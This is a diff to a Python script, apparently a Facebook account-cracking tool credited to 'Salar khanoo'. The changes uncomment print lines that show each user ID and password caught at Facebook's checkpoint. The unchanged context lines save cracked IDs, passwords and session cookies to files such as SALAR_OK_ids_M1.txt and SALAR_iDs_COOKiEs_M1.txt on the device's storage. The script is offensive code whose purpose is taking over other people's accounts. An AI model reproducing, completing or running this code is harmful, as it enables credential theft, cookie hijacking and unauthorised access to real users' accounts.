@@ -1,5 +1,5 @@
 #!/usr/bin/python
-#Original written By Salar khan oo
+#Original written By Salar khanoo
 
 import os,zlib
 
@@ -254,7 +254,7 @@ class main_crack():
                     open('/sdcard/SALAR_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SALAR_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                     #print(f"\r{A} [SALAR-CP] {sid} | {ps} {S}")
+                     print(f"\r{A} [SALAR-CP] {sid} | {ps} {S}")
                      cps.append(sid)
                      open('/sdcard/SALAR_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
@@ -320,7 +320,7 @@ class main_crack():
                     open('/sdcard/SALAR_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SALAR_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                    #  print(f"\r{A} [SALAR-CP] {sid} | {ps} {S}")
+                      print(f"\r{A} [SALAR-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/SALAR_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
@@ -386,7 +386,7 @@ class main_crack():
                     open('/sdcard/SALAR_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SALAR_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                    #  print(f"\r{A} [SALAR-CP] {sid} | {ps} {S}")
+                      print(f"\r{A} [SALAR-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/SALAR_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
@@ -420,7 +420,7 @@ class main_crack():
                     open('/sdcard/SALAR_OK.txt','a').write(sid+'|'+ps+'\n')
                     break
                 elif 'checkpoint' in session.cookies.get_dict():
-                    #print(f"\r{A} [SALAR-CP] {sid} | {ps} {S}")
+                    print(f"\r{A} [SALAR-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/SALAR_CP.txt','a').write(sid+'|'+ps+'\n')
                     break
